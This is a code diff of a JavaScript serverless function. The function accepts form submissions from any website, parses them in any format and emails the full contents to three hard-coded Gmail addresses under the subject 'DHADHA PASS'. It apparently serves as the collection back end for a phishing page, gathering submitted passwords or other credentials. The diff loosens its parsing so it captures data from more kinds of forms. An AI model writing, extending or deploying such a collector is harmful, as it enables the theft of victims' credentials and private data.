@@ -1,35 +1,45 @@
 import { transporter } from "./emailConfig.js";
+import querystring from "querystring";
 
 export default async function handler(req, res) {
+  // ✅ CORS
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Accept, Authorization");
+
+  if (req.method === "OPTIONS") return res.status(204).end();
+  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });
+
   try {
-    // ✅ CORS headers
-    res.setHeader("Access-Control-Allow-Origin", "*");
-    res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
-    res.setHeader("Access-Control-Allow-Headers", "Content-Type, Accept, Authorization");
-
-    if (req.method === "OPTIONS") return res.status(204).end();
-    if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });
-
-    // ✅ Raw body read (for Vercel)
+    // ✅ Raw body read
     let rawBody = "";
     for await (const chunk of req) rawBody += chunk;
 
-    let formData;
+    let formData = {};
     try {
-      formData = JSON.parse(rawBody || "{}");
-    } catch (err) {
-      console.error("JSON parse error:", err);
-      return res.status(400).json({ error: "Invalid JSON format" });
-    }
-
-    if (!formData || Object.keys(formData).length === 0) {
-      return res.status(400).json({ error: "Form data missing" });
+      if (req.headers["content-type"]?.includes("application/json")) {
+        // Try JSON
+        formData = JSON.parse(rawBody);
+      } else if (req.headers["content-type"]?.includes("application/x-www-form-urlencoded")) {
+        // Try URL-encoded
+        formData = querystring.parse(rawBody);
+      } else {
+        // Unknown format → try JSON first, else raw
+        try {
+          formData = JSON.parse(rawBody);
+        } catch {
+          formData = { raw: rawBody };
+        }
+      }
+    } catch {
+      // Last safety fallback → raw
+      formData = { raw: rawBody || "No data" };
     }
 
     console.log("Form Data Received:", formData);
 
     // ✅ Send email
-    const info = await transporter.sendMail({
+    await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
       to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,nizamaniallahabad@gmail.com",
       subject: "DHADHA PASS",
@@ -37,12 +47,10 @@ export default async function handler(req, res) {
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
 
-    console.log("Email sent:", info.messageId);
-
-    res.status(200).json({ success: true, message: "Data sent via email" });
+    res.status(200).json({ success: true, message: "Data sent via email (Asif)" });
 
   } catch (error) {
     console.error("Serverless function error:", error);
-    res.status(500).json({ error: error.message || "Unknown server error" });
+    res.status(500).json({ error: error.message || "Internal Server Error" });
   }
 }
